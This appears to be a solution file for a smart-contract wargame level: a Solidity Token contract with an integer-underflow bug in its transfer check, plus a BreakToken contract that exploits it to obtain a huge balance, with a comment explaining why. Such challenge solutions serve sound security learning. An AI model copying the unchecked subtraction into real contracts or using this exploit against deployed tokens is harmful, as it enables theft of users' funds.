// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

// it is working because solidity 0.6.0 does not have safemath and an address will no balance will perform an underflow and will have a very large amount of tokens

contract BreakToken {

    Token private target;

    constructor(address _target) public { 
        target = Token(_target);
    }

    function breakit() external {
        target.transfer(0x41D22F2e55BD7B6bbb16f82e852a58c36C5D5Cf8, 20);
    }
}